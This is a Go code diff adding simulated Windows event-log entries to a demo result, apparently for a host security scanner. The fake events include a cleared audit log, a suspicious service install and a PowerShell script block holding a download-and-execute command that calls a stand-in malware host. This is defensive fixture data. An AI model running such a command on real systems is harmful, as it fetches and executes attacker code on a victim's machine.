@@ -36,6 +36,12 @@ func demoResult() scanResult {
 			{Name: "jdoe", SID: "S-1-5-21-1001", Enabled: true, Admin: true, LastLogon: "2026-06-14 18:02"},
 			{Name: "Guest", SID: "S-1-5-21-501", Enabled: true, Admin: false},
 		},
+		Events: []core.Event{
+			{Channel: "Security", Provider: "Microsoft-Windows-Security-Auditing", ID: 1102, Time: "2026-06-14T17:59:01", Message: "The audit log was cleared.", Data: map[string]string{"SubjectUserName": "jdoe"}},
+			{Channel: "Microsoft-Windows-PowerShell/Operational", Provider: "PowerShell", ID: 4104, Time: "2026-06-14T18:00:12", Message: "Creating Scriptblock text", Data: map[string]string{"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://malware-c2.example/a')"}},
+			{Channel: "System", Provider: "Service Control Manager", ID: 7045, Time: "2026-06-14T18:01:40", Message: "A service was installed in the system.", Data: map[string]string{"ServiceName": "WinUpdater", "ImagePath": `C:\Users\jdoe\AppData\Local\Temp\update.exe`}},
+			{Channel: "Security", Provider: "Microsoft-Windows-Security-Auditing", ID: 4732, Time: "2026-06-14T18:01:55", Message: "A member was added to a security-enabled local group.", Data: map[string]string{"TargetUserName": "Administrators", "MemberName": "jdoe"}},
+		},
 	}
 
 	findings := []core.Finding{
